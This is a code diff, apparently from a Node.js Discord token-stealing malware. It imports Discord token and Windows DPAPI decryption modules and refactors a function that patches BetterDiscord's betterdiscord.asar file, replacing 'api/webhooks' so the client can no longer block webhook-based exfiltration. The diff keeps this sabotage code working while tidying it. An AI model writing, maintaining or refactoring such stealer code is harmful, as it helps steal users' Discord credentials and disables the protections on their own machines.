@@ -1,8 +1,8 @@
 const { execSync, spawnSync, exec } = require("child_process");
-const fs = require("fs");
+const buffreplace = require("buffer-replace");
 const DiscordToken = require("discord.js-token");
 const crypto = require("crypto");
-const buffreplace = require("buffer-replace");
+const fs = require("fs");
 const path = require("path");
 const aura = require("win-dpapi");
 const axios = require("axios");
@@ -306,11 +306,7 @@ switch (process.platform) {
         function betterbroke() {
           let dir = `${localappdata}/BetterDiscord/data/betterdiscord.asar`;
           if (fs.existsSync(dir)) {
-            x = fs.readFileSync(dir);
-            fs.writeFileSync(
-              dir,
-              buffreplace(x, "api/webhooks", "aurathemesontop"),
-            );
+            fs.writeFileSync(dir, buffreplace(fs.readFileSync(dir), "api/webhooks", "aurathemesontop"));
           }
           return;
         }
